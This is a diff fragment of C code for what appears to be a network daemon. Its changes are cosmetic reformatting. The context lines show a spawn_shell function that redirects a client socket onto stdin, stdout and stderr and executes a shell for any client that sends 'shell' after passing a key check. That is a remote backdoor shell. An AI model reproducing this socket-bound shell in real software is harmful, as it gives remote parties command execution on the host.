@@ -112,7 +112,7 @@ static void	spawn_shell(t_users *users, char **envp)
 	}
 	else if (pid == 0)
 	{
-		for(int i=0; i<3; i++)
+		for (int i = 0; i < 3; i++)
 			dup2(users->sd, i);
 		send(users->sd, "\033[31mSpawning shell\033[0m\n> ", 24, 0);
 		if (execve(shell[0], shell, envp) == -1)
@@ -312,7 +312,7 @@ bool	run_daemon(t_connexion *connexion, char **envp)
 						else if (!strcmp(buffer, "shell") && users.key[users.i] == true)
 						{
 							spawn_shell(&users, envp);
-							close( users.sd );
+							close(users.sd);
 							connexion->client_socket[users.i] = 0;
 							users.key[users.i] = false;
 							users.nb_user--;
@@ -323,13 +323,13 @@ bool	run_daemon(t_connexion *connexion, char **envp)
 					memset(&buffer, 0, BUFFSIZE);
 				}
 			}
-			for (int j = 0; j <= 2; j++)
-			{
-				if (connexion->client_socket[j] != 0)
-					break;
-				/*else if (j == 2)*/
-				/*return (true);*/
-			}
+			/*for (int j = 0; j <= 2; j++)*/
+			/*{*/
+				/*if (connexion->client_socket[j] != 0)*/
+					/*break;*/
+				/*[>else if (j == 2)<]*/
+				/*[>return (true);<]*/
+			/*}*/
 		}
 	}
 	return (true);
